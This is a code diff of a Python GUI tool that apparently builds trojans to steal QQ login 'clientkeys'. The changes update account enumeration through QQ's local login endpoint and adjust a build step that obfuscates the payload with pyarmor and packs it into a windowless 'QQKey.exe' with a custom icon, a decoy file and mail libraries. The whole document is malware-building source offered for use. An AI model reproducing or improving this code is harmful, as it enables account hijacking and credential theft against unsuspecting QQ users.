@@ -12,7 +12,6 @@ import os
 import subprocess
 import zipfile
 import time
-from time import sleep
 import sys
 import base64
 import dns.resolver
@@ -391,11 +390,18 @@ class Ui_Dialog(object):
             get_uins_req = session.get(f"https://localhost.ptlogin2.qq.com:4301/pt_get_uins", params=params,
                                        cookies=q_cookies,
                                        headers=headers, timeout=3)
+            print(f"[Debug] 获取到的QQ号信息,如有获取有误请将本行发送给作者:{get_uins_req.text}")
             uins = re.findall('"uin":(\d+)', get_uins_req.text)
             nickname = re.findall('"nickname":"(.*?)"', get_uins_req.text)
             self.listWidget.clear()
-            for i,j in zip(uins,nickname):
-                self.listWidget.addItem(f"{j}:{i}")
+            for i in range(len(uins)):
+                if nickname:
+                    self.listWidget.addItem(f"{nickname[i]}:{uins[i]}")
+                else:
+                    get_nickname_req = requests.get(f'https://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins={uins[i]}')
+                    get_nickname_req.encoding = 'utf-8'
+                    name = re.findall(r'\[.*,.*,.*,.*,.*,.*,"(.*)",.*\]', get_nickname_req.text)[0]
+                    self.listWidget.addItem(f"{name}:{uins[i]}")
             print("[Info] 请在左侧列表中选择您要获取的QQ号后双击以获取clientkey!")
         except requests.exceptions.ConnectionError as e:
             if "10054" in e.__str__(): # 10054则代表远程主机强迫关闭了一个现有的连接,即不支持(对应版本9.7.2x)
@@ -586,7 +592,6 @@ nickname={nickname}
         sys.stdout = sys.__stdout__
         print(self.icon_path)
 
-
     def generate_trojan(self, reset_icon_path=False):
         sys.stdout = self.output_signal
         self.func_running = True
@@ -600,11 +605,10 @@ nickname={nickname}
                 sys.stdout = sys.__stdout__
                 self.func_running = False
                 return
-            sleep(1)
             print("正在验证文件完整性...")
-            if encrypt('Tools.zip', 'md5') == '6081a2b32ba7f94b8d1316dce70edf24':
+            if encrypt('Tools.zip', 'md5') == '563a84f871e7387d49e59ac79350037e':
                 pass
-            elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e','ba44b872e7d53f5c7dfb1da1c0d114a2']:
+            elif encrypt('Tools.zip', 'md5') in ['65e83fcb0f3a0f6729d24a24794eefb5','1dc8bc2b6fef8a0933f15c419f9ef99e','ba44b872e7d53f5c7dfb1da1c0d114a2','6081a2b32ba7f94b8d1316dce70edf24']:
                 print("失败,检测到您正在使用旧版搭建包,请删除现有搭建包重新打开工具下载新版搭建包!")
                 sys.stdout = sys.__stdout__
                 self.func_running = False
@@ -722,7 +726,7 @@ os.startfile(file)\n""" + content
             encrypting_log = subprocess.Popen(".\\data\\Scripts\\pyarmor.exe gen qkey_code.py --output=final_code --enable-jit",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             encrypting_log = encrypting_log.communicate()
             print("开始打包...")
-            packing_log = subprocess.Popen(f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} .\\final_code\\qkey_code.py --paths=.\\final_code\\{f' --add-data {self.file_path};.' if self.file_path else ''} --hidden-import requests --hidden-import smtplib --hidden-import email.mime.text --noupx",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+            packing_log = subprocess.Popen(f".\\data\\Scripts\\pyinstaller.exe -F -w{' -i '+self.icon_path.replace('/',__) if self.icon_path != '' else ''} .\\final_code\\qkey_code.py --paths=.\\final_code\\{f' --add-data {self.file_path};.' if self.file_path else ''} --hidden-import requests --hidden-import smtplib --hidden-import email.mime.text  --hidden-import concurrent.futures --noupx",creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
             packing_log = packing_log.communicate()
             if os.path.isfile("QQKey.exe"):
                 os.remove('QQKey.exe')
